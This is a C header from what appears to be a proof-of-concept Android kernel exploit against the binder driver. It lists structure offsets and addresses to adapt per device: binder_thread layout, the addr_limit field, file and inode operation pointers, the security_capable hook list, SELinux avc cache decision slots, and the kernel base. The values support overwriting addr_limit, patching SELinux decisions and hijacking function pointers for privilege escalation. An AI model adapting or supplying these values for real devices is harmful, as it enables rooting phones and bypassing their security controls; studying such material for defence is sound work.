#ifndef _KERNEL_DEFS__H_
#define _KERNEL_DEFS__H_

// These definitions can vary across kernel versions/builds. 
// If you wish to adapt the POC for your device, modify them accordingly. 

// Offset of task_struct (task) field in binder_thread structure 
#define TASK_BINDER_THREAD_OFFSET      0x188

// Offset of wait_queue_head_t (wait) field in binder_thread structure
#define WAITQUEUE_BINDER_THREAD_OFFSET 0x98

// Size of binder_thread structure in bytes
#define BINDER_THREAD_SZ               0x190

// Offset of thread_info structure in task_struct (if not in kstack)
#define THREAD_INFO_TASK_OFFSET        0x0

// Offset of stack pointer field in task_struct
#define KSTACK_TASK_OFFSET             0x8

// Offset of addr_limit in thread_info structure
#define ADDR_LIMIT_THREAD_INFO_OFFSET  0x8

// Size of a thread's kernel stack
#define THREAD_KSTACK_SIZE             0x4000

// Offset of files_struct pointer in task_struct
#define FILES_STRUCT_TASK_OFFSET       0x768

// Offset of fdtable pointer in files_struct
#define FDTABLE_FILES_STRUCT_OFFSET    0x20

// Offset of files/fd array in fdtable
#define FD_ARRAY_FDTABLE_OFFSET        0x8

// Offset of file_operations pointer in file
#define FILE_OPS_FILE_OFFSET           0x28

// Offset of check_flags pointer in file_operations
#define CHECK_FLAGS_FILE_OPS_OFFSET    0xB0

// Offset of vfsmount pointer in file (part of path structure)
#define MNT_FILE_OFFSET                0x10

// Offset of mnt_flags in vfsmont
#define MNT_FLAGS_MNT_OFFSET           0x18

// Offset of dentry pointer in file (part of path structure)
#define DENTRY_FILE_OFFSET             0x18

// Offset of inode pointer in dentry
#define INODE_DENTRY_OFFSET            0x30

// Offset of inoide_operations pointer in inode
#define INODE_OPS_INODE_OFFSET         0x20

// Offset of get_attr in inode_operations
#define GET_ATTR_INODE_OPS_OFFSET      0x90

// Offset of security_capable list head in security_hook_heads
#define SECURITY_CAPABLE_OFFSET        0x80

// Number of decision slots stored in the avc cache
#define AVC_CACHE_SLOTS                0x200

// Offset of the decision field in an avc_cache slot
#define DECISION_AVC_CACHE_OFFSET      0x1C

// Address to start memory searches in the kernel
#define KERNEL_BASE                    0xffffff8008080000

// Kernel/Userspace memory address separation
#define USER_DS                        0x8000000000
#define KERNEL_DS                      0xFFFFFFFFFFFFFFFF
#define IS_KERNEL_POINTER(x)           (((x > KERNEL_BASE) && (x < KERNEL_DS))?1:0)

#endif